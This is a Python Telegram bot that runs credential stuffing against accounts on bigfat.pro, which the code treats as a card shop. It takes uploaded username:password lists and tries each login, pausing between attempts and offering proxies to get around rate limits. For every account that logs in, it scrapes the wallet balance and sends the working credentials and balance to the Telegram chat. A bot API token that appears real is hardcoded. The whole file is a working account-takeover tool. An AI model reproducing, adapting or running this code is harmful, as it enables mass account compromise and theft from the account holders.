import telebot
import os
import requests
import time
from telebot import types

# Your bot's API key from Telegram
api = '7707030220:AAEtkUvnL4MlsShLckfG1LMm0QBOKWK42yg'
bot = telebot.TeleBot(api)

class BigfatCCShop:
    def __init__(self, user, password, proxies=None):
        self.session = requests.Session()
        self.base_url = "https://bigfat.pro"
        self.user = user
        self.password = password
        self.proxies = proxies

    def login(self):
        login_url = f"{self.base_url}"
        data = {
            'email': self.user,
            'password': self.password,
            'phpsid_update': '1'
        }
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                          "(KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*"
        }
        response = self.session.post(login_url, data=data, headers=headers, proxies=self.proxies)

        if "https://bigfat.pro/cart" in response.text:
            return "hit", response.text
        elif "No match for Nickname and/or Password." in response.text:
            return "dead", response.text
        elif any(ban_key in response.text for ban_key in ["try again", "You are being rate limited", "1015"]):
            return "error", response.text
        else:
            return "good", response.text

    def get_wallet_balance(self):
        wallet_url = f"{self.base_url}/transactions"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                          "(KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*"
        }
        response = self.session.get(wallet_url, headers=headers, proxies=self.proxies)
        
        balance_start = response.text.find('<span class="bf-money-amount" data-balance_value="') + len('<span class="bf-money-amount" data-balance_value="')
        balance_end = response.text.find('">', balance_start)
        balance = response.text[balance_start:balance_end] if balance_start != -1 and balance_end != -1 else None

        return balance if balance else "0"

    def logout(self):
        logout_url = f"{self.base_url}/logout"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                          "(KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*"
        }

        response = self.session.get(logout_url, headers=headers, proxies=self.proxies)

        if response.status_code == 200:
            return "[SUCCESS] Logged out successfully"
        else:
            return "[ERROR] Failed to log out"

# Function to send messages in chunks
def send_message_chunked(chat_id, message_text):
    max_message_length = 4000  # Safe limit for message size
    if len(message_text) <= max_message_length:
        bot.send_message(chat_id, message_text)
    else:
        for i in range(0, len(message_text), max_message_length):
            bot.send_message(chat_id, message_text[i:i + max_message_length])

# Function to update inline keyboard in real-time
def update_keyboard(chat_id, total, hits, good, dead, errors, message_id):
    markup = types.InlineKeyboardMarkup()
    total_button = types.InlineKeyboardButton(f"Total: {total}", callback_data='total')
    hit_button = types.InlineKeyboardButton(f"Hits: {hits}", callback_data='hit')
    good_button = types.InlineKeyboardButton(f"Good: {good}", callback_data='good')
    dead_button = types.InlineKeyboardButton(f"Dead: {dead}", callback_data='dead')
    error_button = types.InlineKeyboardButton(f"Errors: {errors}", callback_data='error')
    markup.add(total_button, hit_button, good_button, dead_button, error_button)

    bot.edit_message_reply_markup(chat_id, message_id, reply_markup=markup)

# Function to process the file and categorize the accounts, updating in real-time
def process_file(file_path, chat_id, message_id):
    total = hits = good = dead = errors = 0

    with open(file_path, 'r') as file:
        for line in file:
            total += 1
            username, password = line.strip().split(":")
            account = BigfatCCShop(username, password)
            status, login_response = account.login()

            if status == "hit":
                hits += 1
                balance = account.get_wallet_balance()
                logout_status = account.logout()
                message_text = f"User » {username}\nPass » {password}\nStatus » Login Done\nStatus2 » {logout_status}\nBalance » {balance}\nDev » @SmokeCigrette"
                send_message_chunked(chat_id, message_text)
            elif status == "good":
                good += 1
                balance = account.get_wallet_balance()
                logout_status = account.logout()
                message_text = f"User » {username}\nPass » {password}\nStatus » Login Done\nStatus2 » {logout_status}\nBalance » {balance}\nDev » @SmokeCigrette"
                send_message_chunked(chat_id, message_text)
            elif status == "dead":
                dead += 1
            elif status == "error":
                errors += 1

            # Update keyboard
            update_keyboard(chat_id, total, hits, good, dead, errors, message_id)

            # Add delay to avoid hitting rate limit
            time.sleep(1.5)

# Start Command Handler
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome! Please upload a file containing username:password combinations to start checking.")

# File Handler
@bot.message_handler(content_types=['document'])
def handle_file(message):
    try:
        file_id = message.document.file_id
        file_info = bot.get_file(file_id)
        downloaded_file = bot.download_file(file_info.file_path)

        file_path = os.path.join(os.getcwd(), message.document.file_name)
        with open(file_path, 'wb') as file:
            file.write(downloaded_file)

        bot.reply_to(message, "File received. Checking started...")
        markup = types.InlineKeyboardMarkup()
        total_button = types.InlineKeyboardButton("Total: 0", callback_data='total')
        hit_button = types.InlineKeyboardButton("Hits: 0", callback_data='hit')
        good_button = types.InlineKeyboardButton("Good: 0", callback_data='good')
        dead_button = types.InlineKeyboardButton("Dead: 0", callback_data='dead')
        error_button = types.InlineKeyboardButton("Errors: 0", callback_data='error')
        markup.add(total_button, hit_button, good_button, dead_button, error_button)

        msg = bot.reply_to(message, "Your Combos Checking Started", reply_markup=markup)
        process_file(file_path, message.chat.id, msg.id)  # Pass msg.id (integer) instead of msg.message_id

    except Exception as e:
        bot.reply_to(message, f"Error occurred: {str(e)}")

# Callback query handler for buttons
@bot.callback_query_handler(func=lambda call: True)
def callback_inline(call):
    try:
        # Answer the callback query promptly to avoid timeout errors
        bot.answer_callback_query(call.id)
        
        # Handle the callback data
        if call.data == 'total':
            bot.send_message(call.message.chat.id, "Total combos processed.")
        elif call.data == 'hit':
            bot.send_message(call.message.chat.id, "Hit accounts show a balance.")
        elif call.data == 'good':
            bot.send_message(call.message.chat.id, "Good accounts show no balance.")
        elif call.data == 'dead':
            bot.send_message(call.message.chat.id, "Dead accounts could not log in.")
        elif call.data == 'error':
            bot.send_message(call.message.chat.id, "Error occurred while processing some accounts.")
    except Exception as e:
        print(f"Error in callback: {e}")

# Run the bot with rate-limited polling
bot.polling(none_stop=True, interval=2, allowed_updates=['message', 'callback_query'])
